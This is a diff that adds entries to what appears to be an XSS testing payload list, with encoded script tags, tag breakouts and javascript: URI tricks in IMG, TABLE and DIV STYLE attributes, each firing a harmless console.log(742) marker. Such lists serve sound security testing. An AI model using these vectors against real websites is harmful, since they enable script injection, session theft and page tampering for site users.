@@ -34,3 +34,13 @@ x' onpointermove='console.log(742)'
 %C0%BCscript>console.log(742)</script> %E0%80%BCscript>console.log(742)</script> %F0%80%80%BCscript>console.log(742)</script> %F8%80%80%80%BCscript>console.log(742)</script> %FC%80%80%80%80%BCscript>console.log(742)</script>
 %3c%73%63%72%69%70%74%3e%63%6f%6e%73%6f%6c%65%2e%6c%6f%67%28%37%34%32%29%3b%3c%2f%73%63%72%69%70%74%3e
 %25%33%63%25%37%33%25%36%33%25%37%32%25%36%39%25%37%30%25%37%34%25%33%65%25%36%33%25%36%66%25%36%65%25%37%33%25%36%66%25%36%63%25%36%35%25%32%65%25%36%63%25%36%66%25%36%37%25%32%38%25%33%37%25%33%34%25%33%32%25%32%39%25%33%62%25%33%63%25%32%66%25%37%33%25%36%33%25%37%32%25%36%39%25%37%30%25%37%34%25%33%65
+';console.log(742)//\';console.log(742)//";console.log(742)//\";console.log(<script>console.log(742)</script>
+//--></SCRIPT>">'><SCRIPT>console.log(742)</SCRIPT>
+<<SCRIPT>console.log(742);//<</SCRIPT>
+<SCRIPT>a=/XSS/console.log(742)</SCRIPT>
+<IMG """><SCRIPT>console.log(742)</SCRIPT>">
+<IMG SRC=" &#14;  javascript:console.log(742);">
+</TITLE><SCRIPT>console.log(742);</SCRIPT>
+<TABLE><TD BACKGROUND="javascript:console.log(742)">
+<DIV STYLE="background-image: url(javascript:console.log(742))">
+<DIV STYLE="width: expression(console.log(742);">
